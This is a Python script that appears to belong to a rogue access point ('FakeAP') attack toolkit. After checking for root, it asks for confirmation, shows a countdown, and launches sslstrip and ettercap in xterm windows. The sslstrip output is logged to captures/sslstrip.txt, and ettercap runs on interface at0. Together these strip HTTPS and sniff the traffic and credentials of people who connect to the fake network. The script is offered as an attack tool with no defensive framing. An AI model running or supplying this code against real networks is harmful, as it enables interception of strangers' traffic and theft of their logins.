import os
import time

def attack(): # Launch Attack!!!
  os.system("clear")
  print("Everything is done, FakeAP is prepeared!")
  proceed = input("\nAttack?(y/n) -->")
  if proceed == "y":
    os.system("clear")
    print("Launching Sslstrip...")
    time.sleep(0.7)
    os.system("clear")
    print("\n\n\n\t\t\t\t3")
    time.sleep(1)
    os.system("clear")
    print("\n\n\n\t\t\t\t2")
    time.sleep(1)
    os.system("clear")
    print("\n\n\n\t\t\t\t1")
    time.sleep(1)
    os.system("clear")
    print("Launched!  (Result on captures/sslstrip.txt)")
    os.system("xterm -e 'sslstrip -a -w captures/sslstrip.txt' &") # Launch Sslstrip!
    os.system("xterm -e 'ettercap -p -u -T -q -i at0' &") # Launch Ettercap
    os.system("clear")
    print("Do you want to launch another attack?")
    time.sleep(1.5)
    os.system("clear")
    os.system("python creator/attacks/main.py")
  elif proceed == "n":
    os.system("clear")
    print("Aborted!")
    time.sleep(1)
    os.system("clear")
    print("Back to menu...")
    time.sleep(1)
    os.system("clear")
    os.system("python creator/attacks/main.py")
  else:
    os.system("clear")
    print("Yes(y) or No(n).")
    time.sleep(1)
    os.system("clear")
    attack()

def noroot(): # noRoot
  os.system("clear")
  print("RUN AS ROOT!")
  time.sleep(2)
  exit()

# Root verification
root = os.geteuid()
if root == 0:
  attack()
else:
  noroot()
